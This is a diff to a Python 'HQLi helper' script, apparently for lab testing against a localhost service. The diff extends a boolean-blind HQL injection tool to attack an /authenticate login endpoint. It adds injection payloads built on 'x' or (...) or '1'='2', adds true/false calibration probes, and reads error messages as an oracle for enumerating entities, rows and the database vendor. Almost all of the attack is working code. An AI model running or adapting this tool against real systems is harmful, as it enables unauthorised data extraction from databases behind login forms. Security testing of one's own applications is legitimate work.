@@ -5,7 +5,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # =======================
 # CONFIG (edit these)
 # =======================
-URL = "http://127.0.0.1:8443/checkvalidagent"  # GET endpoint that accepts ?agentCode=
+CHEK_AGENT_URL = "http://127.0.0.1:8443/checkvalidagent"
+AUTHENTICATE_URL = "http://127.0.0.1:8443/authenticate"
 VERIFY_TLS = False
 PROXY = {}  # disabled by default; set via --proxy <url>
 HEADERS = {}  # extra headers if needed
@@ -34,6 +35,9 @@ DEBUG = False
 AI_MODE = False
 AI_FIELD_COUNT = 10
 ID_FIELD = None
+TARGET = "AGENT"  # or AUTHENTICATE
+AUTH_CALIBRATED = False
+AUTH_NULL_IS_TRUE = True  # will be set during calibration
 
 
 def _lower_camel(s: str) -> str:
@@ -187,6 +191,11 @@ def esc(s: str) -> str:
 
 def inj(expr: str) -> str:
     # Boolean oracle wrapper
+    if TARGET == "AUTHENTICATE":
+        # Use a non-existent base username so the oracle depends on expr:
+        # - message null => True (expr satisfied)
+        # - message "Username or password is incorrect" => False
+        return f"x' or ({expr}) or '1'='2"
     return f"0' or ({expr}) or '1'='2"
 
 def exists(hql_bool: str) -> str:
@@ -382,9 +391,33 @@ def discover_id_field(cli_override = None) -> str:
     return ID_FIELD
 
 def do_request(agent: str):
-    params = {"agentCode": agent}
-    r = requests.get(URL, params=params, headers=HEADERS,
-                     timeout=20, verify=VERIFY_TLS, proxies=PROXY)
+    if TARGET == "AUTHENTICATE":
+        # Server expects an AuthenticateRequest envelope: { header: {}, payload: { userName, password } }
+        body = {
+            "header": {},
+            "payload": {
+                "userName": agent,
+                "password": "x",
+            },
+        }
+        r = requests.post(
+            AUTHENTICATE_URL,
+            json=body,
+            headers=HEADERS,
+            timeout=20,
+            verify=VERIFY_TLS,
+            proxies=PROXY,
+        )
+    else:
+        params = {"agentCode": agent}
+        r = requests.get(
+            CHEK_AGENT_URL,
+            params=params,
+            headers=HEADERS,
+            timeout=20,
+            verify=VERIFY_TLS,
+            proxies=PROXY,
+        )
     global REQUESTS_SENT, LAST_MSG
     REQUESTS_SENT += 1
     try:
@@ -402,16 +435,67 @@ def do_request(agent: str):
         time.sleep(SLEEP_BETWEEN)
     return j
 
+def _auth_calibrate_oracle():
+    """Calibrate AUTHENTICATE oracle by sending two simple payloads and learning
+    whether a null message corresponds to True or False.
+    Uses non-existent base 'x'. Does not rely on entity rows.
+    """
+    global AUTH_CALIBRATED, AUTH_NULL_IS_TRUE
+    if TARGET != "AUTHENTICATE":
+        AUTH_CALIBRATED = True
+        return
+    # Build two direct payloads without inj(): true-like and false-like
+    true_probe = "x' or '1'='1"
+    false_probe = "x' or '1'='2"
+    # Send requests
+    j1 = do_request(true_probe) or {}
+    mi1 = j1.get("msgInfo") or {}
+    m1 = mi1.get("message")
+    j2 = do_request(false_probe) or {}
+    mi2 = j2.get("msgInfo") or {}
+    m2 = mi2.get("message")
+    # If message is None for '1'='1' and non-empty for '1'='2', then null means True
+    if (m1 is None or m1 == "") and (m2 is not None and m2 != ""):
+        AUTH_NULL_IS_TRUE = True
+    # If reversed, set accordingly
+    elif (m1 is not None and m1 != "") and (m2 is None or m2 == ""):
+        AUTH_NULL_IS_TRUE = False
+    # Else keep default (True) but mark calibrated
+    AUTH_CALIBRATED = True
+    AUTH_CALIBRATED = True
+
 def truthy(agent: str):
+    global AUTH_CALIBRATED
+    if TARGET == "AUTHENTICATE" and not AUTH_CALIBRATED:
+        _auth_calibrate_oracle()
     j = do_request(agent)
     if not j: return None
     mi = j.get("msgInfo") or {}
     sc = str(mi.get("statusCode") or "")
+    msg = (mi.get("message") or "")
     payload = j.get("payload") or {}
-    if sc == "400" or payload.get("statusMsg") == "Agent Already Registered":
-        return True
-    if sc == "401":
-        return False
+    if TARGET == "AUTHENTICATE":
+        # AUTH responses are 401 for both exist and not-exist; use message hints conservatively
+        m = msg.lower()
+        if not msg:
+            # message null/empty -> True or False depending on calibration
+            return True if AUTH_NULL_IS_TRUE else False
+        if "username or password is incorrect" in m:
+            return False if AUTH_NULL_IS_TRUE else True
+        if "syntaxexception" in m or "sqlgrammarexception" in m:
+            # Indicates failed function/property probe
+            return False
+        # Fallback to status codes (rare)
+        if sc == "400":
+            return True
+        if sc == "401":
+            return None
+    else:
+        # AGENT endpoint behavior
+        if sc == "400" or payload.get("statusMsg") == "Agent Already Registered":
+            return True
+        if sc == "401":
+            return False
     return None
 
 def oracle_ok() -> bool:
@@ -762,7 +846,7 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
 # Main
 # =======================
 def main():
-    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT, ID_FIELD, PROXY
+    global DEBUG, HQL_ENTITY, AI_MODE, AI_FIELD_COUNT, TARGET_ENTITY_COUNT, ID_FIELD, PROXY, TARGET
     parser = argparse.ArgumentParser(description="HQLi helper")
     parser.add_argument("--debug", action="store_true", help="Enable verbose request logging")
     parser.add_argument("--entity", help="HQL entity name (FQN or simple), e.g. com.pdstat.hqli.entity.User1")
@@ -776,6 +860,7 @@ def main():
     parser.add_argument("--count-rows", action="store_true", help="Print total row count for --entity and exit")
     parser.add_argument("--detect-db", action="store_true", help="Detect database vendor and version via function() probes")
     parser.add_argument("--proxy", metavar="URL", help="Proxy URL for target requests; applied to both http and https. Example: http://127.0.0.1:8080")
+    parser.add_argument("--target", choices=["AGENT","AUTHENTICATE"], default="AGENT", help="Target endpoint: AGENT (GET /checkvalidagent) or AUTHENTICATE (POST /authenticate). Default: AGENT")
     args = parser.parse_args()
     DEBUG = args.debug
     HQL_ENTITY = args.entity
@@ -783,6 +868,7 @@ def main():
     AI_FIELD_COUNT = max(1, min(int(args.ai_field_count or 10), 50))
     TARGET_ENTITY_COUNT = max(1, int(args.entity_count or 2))
     PROXY = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
+    TARGET = (args.target or "AGENT").upper()
 
     if args.detect_db:
         vndr, ver = detect_db_vendor_and_version()
